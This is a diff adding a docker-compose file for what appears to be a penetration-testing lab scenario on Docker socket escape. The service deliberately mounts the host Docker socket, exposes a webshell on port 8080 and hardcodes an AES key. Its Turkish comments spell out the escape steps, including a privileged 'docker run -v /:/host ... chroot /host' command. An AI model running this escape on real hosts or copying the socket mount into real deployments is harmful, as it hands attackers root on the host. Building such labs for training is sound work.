@@ -1,0 +1,23 @@
+# Senaryo 2: Docker Socket Mount Escape
+# Saldiri vektoru:
+#   - docker ps                                   -> host container'lari listele
+#   - docker images                               -> host image'lari listele
+#   - docker run -v /:/host --privileged -it ubuntu chroot /host
+#                                                 -> yeni privileged container ile host'a erisim
+#   - docker exec -it <container_id> /bin/bash    -> diger container'lara erisim
+
+services:
+  webshell-socket:
+    build:
+      context: .
+      dockerfile: Dockerfile
+    image: pentest-webshell:latest
+    container_name: pentest-socket
+    hostname: pentest-node
+    volumes:
+      - /var/run/docker.sock:/var/run/docker.sock
+    ports:
+      - "8080:8080"
+    environment:
+      - WEBSHELL_AES_KEY=a3f1b9c4d7e2f058619a4b7c8d0e1f2a3b4c5d6e7f80910a1b2c3d4e5f607180
+    restart: unless-stopped
